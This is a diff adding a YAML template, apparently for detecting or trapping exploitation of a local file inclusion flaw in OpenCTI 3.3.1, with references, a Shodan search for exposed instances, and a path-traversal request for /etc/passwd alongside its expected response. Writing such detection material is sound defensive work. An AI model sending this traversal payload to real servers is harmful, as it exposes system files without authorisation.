@@ -1,0 +1,28 @@
+id: opencti-lfi
+info:
+  name: OpenCTI 3.3.1 - Local File Inclusion
+  author: 0x_Akoko
+  description: OpenCTI 3.3.1 is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://cxsecurity.com/issue/WLB-2020060078
+  - https://github.com/OpenCTI-Platform/opencti/releases/tag/3.3.1
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: http.html:"OpenCTI"
+  tags: opencti,lfi,oss
+traps:
+- request:
+    method: GET
+    path: /static/css//../../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
